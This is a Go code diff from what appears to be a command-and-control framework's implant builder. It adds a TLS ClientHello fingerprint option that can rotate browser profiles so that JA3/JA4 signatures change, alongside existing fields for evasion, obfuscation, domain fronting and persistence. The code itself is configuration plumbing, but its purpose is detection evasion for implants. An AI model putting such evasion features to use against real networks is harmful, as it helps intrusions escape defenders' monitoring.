@@ -34,37 +34,41 @@ type binaryGenForm struct {
 	C2URL           string `form:"c2_url"`
 	Protocol        string `form:"protocol"`
 	BeaconTransport string `form:"beacon_transport"`
-	Interval        int    `form:"interval"`
-	Jitter          int    `form:"jitter"`
-	BeaconTime      int    `form:"beacon_time"`
-	UserAgent       string `form:"user_agent"`
-	Persist         bool   `form:"persist"`
-	SkipTLSVerify   bool   `form:"skip_tls_verify"`
-	Filename        string `form:"filename"`
-	Profile         string `form:"profile"`
-	ListenerID      uint   `form:"listener_id"`
-	P2PMode         string `form:"p2p_mode"`
-	P2PParent       string `form:"p2p_parent"`
-	P2PListenAddr   string `form:"p2p_listen_addr"`
-	DNSDomain       string `form:"dns_domain"`
-	DNSServer       string `form:"dns_server"`
-	DNSDoHURL       string `form:"dns_doh_url"`
-	DNSDoTAddr      string `form:"dns_dot_addr"`
-	Proxy           string `form:"proxy"`
-	CryptoKey       string `form:"crypto_key"`
-	BeaconKey       string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
-	Architecture    string `form:"architecture"`
-	DomainFront     string `form:"domain_front"`
-	Obfuscate       string `form:"obfuscate"`
-	Evasion         string `form:"evasion"`
-	GhostMode       string `form:"ghost_mode"`
-	WorkingStart    string `form:"working_start"`
-	WorkingEnd      string `form:"working_end"`
-	WorkingTZ       string `form:"working_tz"`
-	SSHUser         string `form:"ssh_user"`
-	SSHPassword     string `form:"ssh_password"`
-	SSHKey          string `form:"ssh_key"`
-	SSHHostKey      string `form:"ssh_host_key"` // base64 server host public key pin
+	// TLSFingerprint selects the implant's ClientHello: ""/"stable" keeps the
+	// fixed Chrome Auto hello, "random" rotates a browser profile per handshake
+	// (JA3 and JA4 both change), or a profile name pins one.
+	TLSFingerprint string `form:"tls_fingerprint"`
+	Interval       int    `form:"interval"`
+	Jitter         int    `form:"jitter"`
+	BeaconTime     int    `form:"beacon_time"`
+	UserAgent      string `form:"user_agent"`
+	Persist        bool   `form:"persist"`
+	SkipTLSVerify  bool   `form:"skip_tls_verify"`
+	Filename       string `form:"filename"`
+	Profile        string `form:"profile"`
+	ListenerID     uint   `form:"listener_id"`
+	P2PMode        string `form:"p2p_mode"`
+	P2PParent      string `form:"p2p_parent"`
+	P2PListenAddr  string `form:"p2p_listen_addr"`
+	DNSDomain      string `form:"dns_domain"`
+	DNSServer      string `form:"dns_server"`
+	DNSDoHURL      string `form:"dns_doh_url"`
+	DNSDoTAddr     string `form:"dns_dot_addr"`
+	Proxy          string `form:"proxy"`
+	CryptoKey      string `form:"crypto_key"`
+	BeaconKey      string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
+	Architecture   string `form:"architecture"`
+	DomainFront    string `form:"domain_front"`
+	Obfuscate      string `form:"obfuscate"`
+	Evasion        string `form:"evasion"`
+	GhostMode      string `form:"ghost_mode"`
+	WorkingStart   string `form:"working_start"`
+	WorkingEnd     string `form:"working_end"`
+	WorkingTZ      string `form:"working_tz"`
+	SSHUser        string `form:"ssh_user"`
+	SSHPassword    string `form:"ssh_password"`
+	SSHKey         string `form:"ssh_key"`
+	SSHHostKey     string `form:"ssh_host_key"` // base64 server host public key pin
 	// mintTenant is not form-bound: parseBinaryForm stamps the building
 	// operator's tenant so the minted registration secret (and thus the
 	// implant's first-registration tenant) follows the builder, not the
@@ -171,6 +175,14 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 	form.MTLSKey = strings.TrimSpace(form.MTLSKey)
 	form.MTLSCA = strings.TrimSpace(form.MTLSCA)
 	if err := payload.ValidateMTLSMaterial(form.MTLSCert, form.MTLSKey, form.MTLSCA); err != nil {
+		respondError(c, http.StatusBadRequest, err.Error())
+		return nil, false
+	}
+
+	// TLS ClientHello option: reject a typo here rather than silently shipping
+	// a stable fingerprint when the operator asked for rotation.
+	form.TLSFingerprint = strings.TrimSpace(form.TLSFingerprint)
+	if _, _, err := payload.NormalizeTLSFingerprint(form.TLSFingerprint); err != nil {
 		respondError(c, http.StatusBadRequest, err.Error())
 		return nil, false
 	}
@@ -460,6 +472,7 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 		C2URL:                 form.C2URL,
 		Protocol:              form.Protocol,
 		BeaconTransport:       form.BeaconTransport,
+		TLSFingerprint:        form.TLSFingerprint,
 		Interval:              interval,
 		Jitter:                jitter,
 		UserAgent:             form.UserAgent,
